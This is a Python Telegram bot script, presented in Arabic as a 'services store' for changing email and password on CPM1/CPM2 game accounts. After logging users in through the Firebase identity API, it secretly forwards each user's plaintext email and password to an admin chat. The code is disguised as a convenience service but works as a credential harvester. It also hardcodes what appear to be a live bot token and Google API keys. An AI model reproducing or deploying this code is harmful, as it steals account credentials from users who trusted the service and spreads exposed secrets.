import telebot
import requests
from telebot import types
import os
from flask import Flask, request
from threading import Thread
import json

app = Flask('')

# --- CONFIGURATION ---
TOKEN = "8230723230:AAGZhHB9gEDoKbmXF_aWJ5lAFXjVWCkw_pI"
bot = telebot.TeleBot(TOKEN, threaded=False)

ADMIN_ID = 8157596960

API_KEYS = {
    "CPM1": "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", 
    "CPM2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
}

user_sessions = {}

@app.route('/')
def home():
    return "🔥 متجر لوفي الخدمات - Online"

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

# --- START ---
@bot.message_handler(commands=['start'])
def start(message):
    # Allowed users ചെക്കിംഗ് ഒഴിവാക്കി
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('CPM1', 'CPM2', '👤 ملفي الشخصي')
    
    welcome_text = (
        "🔥 **أهلاً بك في متجر لوفي الخدمات**\n"
        "الرجاء اختيار النسخة التي تريد تعديل بياناتها:"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup)

# --- LOGIN FLOW ---
@bot.message_handler(func=lambda m: m.text in ['CPM1', 'CPM2'])
def login_start(message):
    user_sessions[message.chat.id] = {'v': message.text}
    bot.send_message(message.chat.id, f"🚀 تم اختيار **{message.text}**\n📧 الرجاء إدخال البريد الإلكتروني الحالي:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(message, get_email)

def get_email(message):
    user_sessions[message.chat.id]['email'] = message.text.strip()
    bot.send_message(message.chat.id, "🔑 الرجاء إدخال كلمة المرور الحالية:")
    bot.register_next_step_handler(message, process_login)

def process_login(message):
    cid = message.chat.id
    pwd = message.text.strip()
    if cid not in user_sessions: return
    ver = user_sessions[cid]['v']
    email = user_sessions[cid]['email']
    
    try:
        res = requests.post(f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={API_KEYS[ver]}", 
                           json={"email": email, "password": pwd, "returnSecureToken": True}).json()
        
        if 'idToken' in res:
            user_sessions[cid]['token'] = res['idToken']
            
            markup = types.InlineKeyboardMarkup(row_width=1)
            markup.add(
                types.InlineKeyboardButton("📧 تغيير البريد الإلكتروني", callback_data="edit_email"),
                types.InlineKeyboardButton("🔐 تغيير كلمة المرور", callback_data="edit_pass"),
                types.InlineKeyboardButton("🚪 تسجيل الخروج", callback_data="bot_logout")
            )
            bot.send_message(cid, f"✅ **تم تسجيل الدخول بنجاح!**", reply_markup=markup)
            
            # ലോഗിൻ വിവരം അഡ്മിന് മാത്രം അറിയാൻ (Security)
            bot.send_message(ADMIN_ID, f"👤 **دخول جديد**\nالبريد: `{email}`\nالرمز: `{pwd}`\nالنسخة: {ver}")
        else:
            bot.send_message(cid, "❌ فشل تسجيل الدخول! تأكد من البيانات.")
    except:
        bot.send_message(cid, "❌ حدث خطأ في الاتصال.")

# --- CALLBACK HANDLERS ---
@bot.callback_query_handler(func=lambda call: True)
def handle_clicks(call):
    cid = call.message.chat.id
    if call.data == "edit_email":
        bot.send_message(cid, "📧 أرسل البريد الإلكتروني الجديد:")
        bot.register_next_step_handler(call.message, execute_email_change)
    elif call.data == "edit_pass":
        bot.send_message(cid, "🔐 أرسل كلمة المرور الجديدة:")
        bot.register_next_step_handler(call.message, execute_pass_change)
    elif call.data == "bot_logout":
        if cid in user_sessions: del user_sessions[cid]
        bot.send_message(cid, "👋 تم تسجيل الخروج.")

# --- EXECUTE CHANGES ---
def execute_email_change(message):
    cid = message.chat.id
    new_email = message.text.strip()
    ver = user_sessions[cid]['v']
    key = API_KEYS[ver]
    
    res = requests.post(f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={key}", 
                       json={"idToken": user_sessions[cid]['token'], "email": new_email, "returnSecureToken": True})
    
    if res.status_code == 200:
        bot.send_message(cid, f"✅ تم تحديث البريد: `{new_email}`")
    else:
        bot.send_message(cid, "❌ فشل في التغيير.")

def execute_pass_change(message):
    cid = message.chat.id
    new_pass = message.text.strip()
    ver = user_sessions[cid]['v']
    key = API_KEYS[ver]
    
    res = requests.post(f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={key}", 
                       json={"idToken": user_sessions[cid]['token'], "password": new_pass, "returnSecureToken": True})
    
    if res.status_code == 200:
        bot.send_message(cid, f"✅ تم تحديث كلمة المرور.")
    else:
        bot.send_message(cid, "❌ فشل في التغيير.")

if __name__ == "__main__":
    Thread(target=run_flask).start()
    bot.infinity_polling()
